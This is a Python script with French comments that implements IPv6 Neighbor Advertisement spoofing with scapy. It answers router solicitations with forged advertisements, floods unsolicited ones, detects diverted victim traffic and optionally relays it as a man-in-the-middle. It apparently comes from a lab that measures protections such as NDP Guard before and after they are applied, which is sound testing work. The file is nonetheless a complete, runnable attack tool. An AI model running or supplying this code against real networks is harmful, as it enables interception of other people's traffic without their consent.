#!/usr/bin/env python3
"""
Attaque —> Usurpation de voisins (Neighbor Advertisement spoofing) + MITM

Critère de réussite (CONTRAT.md §6) :
    le cache de voisins d'une victime associe l'adresse IP du routeur
    à l'adresse MAC de l'attaquant (vérifiable avec `ip -6 neigh` CÔTÉ VICTIME).

Ce script, lui, ne peut PAS lire le cache de la victime (il tourne dans le
conteneur attacker). Il détecte donc le succès indirectement : si l'empoi-
sonnement a marché, la victime se met à envoyer en couche 2 ses paquets
destinés au routeur... à l'adresse MAC de l'attaquant. Le script surveille
cela pour confirmer l'attaque, et en profite pour faire du MITM si demandé.

Étapes de l'attaque dans l'ordre :
  1. (manuel, tshark) observer un échange NS/NA légitime pour connaître le format
  2. sniffer les NS qui demandent l'adresse du routeur               -> _ecouter_ns
  3. construire la réponse NA falsifiée (MAC attaquant, override=1)   -> _construire_na
  4. vérifier l'empoisonnement du cache de la victime                -> _surveiller_detournement (ip -6 neigh, côté victime, MANUEL)
  5. ajouter le MITM fonctionnel (forwarding vers le vrai routeur)    -> --mode mitm
  6. mesurer avant/après, noter dans le CSV                          -> log_resultat
  7. prévoir l'arrêt propre et la restauration du cache normal       -> _restaurer_cache + SIGINT/SIGTERM

Usage dans le conteneur attacker (root requis pour les sockets bruts) :

  # Mode "poison" simple : juste empoisonner, sans relayer le trafic
  sudo python3 na_spoof.py --iface eth1 --phase avant --essai 1 \
      --routeur-ip 2001:db8:10:10::1 --victime-ip 2001:db8:10:10::10 \
      --mode poison --duree 30

  # Mode MITM complet : empoisonner ET relayer vers le vrai routeur
  sudo python3 na_spoof.py --iface eth1 --phase apres --essai 1 \
      --routeur-ip 2001:db8:10:10::1 --victime-ip 2001:db8:10:10::10 \
      --mode mitm --routeur-mac 02:42:ac:11:00:02 --duree 30

Restauration manuelle du cache après le test (côté victime, si besoin) :
  ip -6 neigh flush dev eth0 && ping6 -c1 <routeur-ip>   # force un nouveau NS propre
"""

import signal
import sys
import threading
import time

from common import base_arg_parser, log_resultat, mesurer_latence_ping

try:
    from scapy.all import (
        Ether, IPv6, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr,
        get_if_hwaddr, sendp, sniff,
    )
except ImportError:
    sys.exit("[ERREUR] scapy n'est pas installé dans ce conteneur : pip install scapy") # Si scapy manque dans le conteneur, le script affiche un message clair au lieu d'un Traceback illisible


class AttaqueNASpoof:
    """Regroupe l'état de l'attaque pour éviter les variables globales
    (compteurs, flag d'arrêt, adresses) partagées entre les threads -> écoute des NS, flooding, écoute du détournement
    """

    def __init__(self, iface, routeur_ip, victime_ip, mode, routeur_mac, dry_run):
        self.iface = iface
        self.routeur_ip = routeur_ip
        self.victime_ip = victime_ip
        self.mode = mode              # "poison" ou "mitm"
        self.routeur_mac = routeur_mac  # requis seulement en mode mitm
        self.dry_run = dry_run
        self.mac_attaquant = get_if_hwaddr(iface) #récupère ta MAC une seule fois à la construction
        self.arret = threading.Event()
        self.ns_vus = 0
        self.na_envoyes = 0
        self.paquets_detournes = 0      # preuve que la victime nous envoie son trafic
        self.empoisonnement_confirme = False

    # construction du paquet falsifié 

    def _construire_na(self, dst_ip, dst_mac):
        """NA falsifié : tgt = l'adresse qu'on usurpe (le routeur),
        option Dst-LL-Addr = notre MAC à nous (l'attaquant).
        override=1 (O=1) force la victime à écraser l'entrée existante
        même si elle pense déjà connaître la bonne adresse.
        """
        eth = Ether(src=self.mac_attaquant, dst=dst_mac)
        ip6 = IPv6(src=self.routeur_ip, dst=dst_ip)
        na = ICMPv6ND_NA(tgt=self.routeur_ip, R=0, S=0, O=1)
        opt = ICMPv6NDOptDstLLAddr(lladdr=self.mac_attaquant) #Neighbor Advertisement : « c'est moi » (O=1 force l'écrasement du cache)
        return eth / ip6 / na / opt

    def _envoyer_na(self, dst_ip, dst_mac):
        pkt = self._construire_na(dst_ip, dst_mac)
        if self.dry_run:
            print(f"[DRY-RUN] NA falsifié qui serait envoyé à {dst_ip} ({dst_mac})")
        else:
            sendp(pkt, iface=self.iface, verbose=False)
        self.na_envoyes += 1

    # répondre aux NS légitimes

    def _callback_ns(self, pkt):
        if ICMPv6ND_NS not in pkt or Ether not in pkt:
            return
        # On ne répond qu'aux NS qui demandent l'adresse du routeur qu'on usurpe
        if pkt[ICMPv6ND_NS].tgt != self.routeur_ip:
            return
        self.ns_vus += 1
        victime_mac = pkt[Ether].src
        victime_src_ip = pkt[IPv6].src
        print(f"[NS] {victime_src_ip} ({victime_mac}) demande qui est {self.routeur_ip} -> on répond")
        self._envoyer_na(victime_src_ip, victime_mac)

    def _ecouter_ns(self):
        """Thread 1 : répond à chaque NS en temps réel."""
        filtre_bpf = "icmp6 and ip6[40] == 135"  # l'octet 40 d'un paquet IPv6 est le champ type ICMPv6, et 135 = Neighbor Solicitation
        sniff(
            iface=self.iface, filter=filtre_bpf,
            prn=self._callback_ns, #la fonction appelée à chaque paquet capturé
            stop_filter=lambda p: self.arret.is_set(),
            store=False, #ne garde pas les paquets en mémoire
        )

    # étape bonus : flodding(marteler) des NA non sollicités 

    def _marteler_na(self, intervalle_s=1.0):
        """Thread 2 : en plus des réponses aux NS, on envoie des NA non
        sollicités périodiquement vers la victime. Ça force la mise à jour
        du cache même si la victime ne redemande pas tout de suite, et ça
        rend l'attaque plus difficile à "guérir" seule 
        -> plus réaliste pour tester une vraie protection RA/NDP Guard derrière
        """
        while not self.arret.is_set():
            # On ne connaît la MAC de la victime qu'une fois qu'on a vu un NS
            # (sinon on diffuse en broadcast Ethernet pour la toucher quand même)
            self._envoyer_na(self.victime_ip, "ff:ff:ff:ff:ff:ff")
            self.arret.wait(intervalle_s) # fait à la fois le sleep et vérifie le drapeau d'arrêt

    # ---------- étape 4-5 : détecter l'empoisonnement + MITM ----------

    def _callback_detournement(self, pkt):
        """Si un paquet arrive dans l'interface de l'attaquant avec :
          - destination Ethernet = NOUS (l'attaquant)
          - destination IPv6 = le routeur (pas nous)
        ...c'est que la victime a bien mis notre MAC dans son cache pour
        l'adresse du routeur : l'empoisonnement a marché. En mode MITM,
        on relaie alors le paquet vers le vrai routeur.
        """
        if Ether not in pkt or IPv6 not in pkt:
            return
        if pkt[Ether].dst.lower() != self.mac_attaquant.lower():
            return
        if pkt[IPv6].dst != self.routeur_ip:
            return

        self.paquets_detournes += 1
        if not self.empoisonnement_confirme:
            self.empoisonnement_confirme = True
            print(f"[OK] Empoisonnement confirmé : {self.victime_ip} nous envoie "
                  f"son trafic destiné à {self.routeur_ip}")

        if self.mode == "mitm" and self.routeur_mac:
            relai = pkt.copy()
            relai[Ether].src = self.mac_attaquant
            relai[Ether].dst = self.routeur_mac
            if not self.dry_run:
                sendp(relai, iface=self.iface, verbose=False)
            # NB : pour un MITM bidirectionnel complet il faudrait aussi
            # relayer les réponses du routeur vers la victime. Le routeur
            # répond normalement à l'IP de la victime ; tant que le cache
            # du ROUTEUR n'est pas lui-même empoisonné, ses réponses lui
            # reviennent en direct. Si on veut un MITM total, il faut lancer
            # une 2e instance de ce script côté "routeur -> victime" aussi.

    def _ecouter_detournement(self):
        """Thread 3 : surveille/relaie le trafic détourné (étapes 4 et 5)."""
        filtre_bpf = f"ip6 and not icmp6"
        sniff(
            iface=self.iface, filter=filtre_bpf,
            prn=self._callback_detournement,
            stop_filter=lambda p: self.arret.is_set(),
            store=False,
        )

    # orchestration 

    def executer(self, duree_s):
        threads = [
            threading.Thread(target=self._ecouter_ns, daemon=True),
            threading.Thread(target=self._marteler_na, daemon=True),
            threading.Thread(target=self._ecouter_detournement, daemon=True),
        ]
        for t in threads:
            t.start()
        print(f"[*] Attaque na_spoof en cours sur {self.iface} "
              f"(mode={self.mode}, routeur usurpé={self.routeur_ip}) pendant {duree_s:.0f}s...")
        print("    Ctrl+C pour arrêter proprement avant la fin.")

        def gerer_signal(signum, frame):
            print("\n[!] Arrêt demandé, fin propre de l'attaque...")
            self.arret.set()

        #Intercepte Ctrl+C (SIGINT) et l'arrêt par kill (SIGTERM) pour déclencher self.arret.set() au lieu de tuer le process brutalement
        signal.signal(signal.SIGINT, gerer_signal)
        signal.signal(signal.SIGTERM, gerer_signal)

        fin = time.time() + duree_s
        while time.time() < fin and not self.arret.is_set():
            time.sleep(0.5)
        self.arret.set()
        time.sleep(1)  # laisser les threads sniff se terminer


def main():
    parser = base_arg_parser(
        "Usurpation de voisins IPv6 (NA spoofing) et MITM optionnel"
    )
    parser.add_argument("--routeur-ip", required=True,
                         help="Adresse IPv6 du routeur à usurper (ex: 2001:db8:10:10::1).")
    parser.add_argument("--victime-ip", required=True,
                         help="Adresse IPv6 de la victime ciblée (pour le martèlement et la détection).")
    parser.add_argument("--mode", choices=["poison", "mitm"], default="poison",
                         help="'poison' : empoisonne seulement. 'mitm' : empoisonne ET relaie le trafic volé.")
    parser.add_argument("--routeur-mac", default=None,
                         help="Adresse MAC réelle du routeur, OBLIGATOIRE en mode mitm pour relayer.")
    args = parser.parse_args()

    if args.mode == "mitm" and not args.routeur_mac:
        parser.error("--routeur-mac est obligatoire en --mode mitm.")

    attaque = AttaqueNASpoof(
        iface=args.iface,
        routeur_ip=args.routeur_ip,
        victime_ip=args.victime_ip,
        mode=args.mode,
        routeur_mac=args.routeur_mac,
        dry_run=args.dry_run,
    )

    latence_avant = None if args.dry_run else mesurer_latence_ping(args.routeur_ip, args.iface, count=2)

    attaque.executer(args.duree)

    latence_apres = None if args.dry_run else mesurer_latence_ping(args.routeur_ip, args.iface, count=2)
    latence_ms = latence_apres if latence_apres is not None else latence_avant

    succes = attaque.empoisonnement_confirme or args.dry_run
    commentaire = (
        f"ns_vus={attaque.ns_vus}, na_envoyes={attaque.na_envoyes}, "
        f"paquets_detournes={attaque.paquets_detournes}, mode={args.mode}. "
        f"{args.commentaire}".strip()
    )

    log_resultat(
        attaque="na_spoof",
        phase=args.phase,
        essai=args.essai,
        succes=succes,
        cache_voisins=None,  # concerne surtout ns_flood ; ici vérifié manuellement côté victime
        latence_ms=latence_ms,
        faux_positif=False,  # à mettre à True manuellement si la protection a bloqué à tort un cas légitime
        commentaire=commentaire,
    )

    print(f"\n[FIN] ns_vus={attaque.ns_vus} na_envoyes={attaque.na_envoyes} "
          f"paquets_detournes={attaque.paquets_detournes} succes={succes}")
    print("[RAPPEL] Vérifier aussi CÔTÉ VICTIME avec : ip -6 neigh | grep <routeur-ip>")


if __name__ == "__main__":
    main()
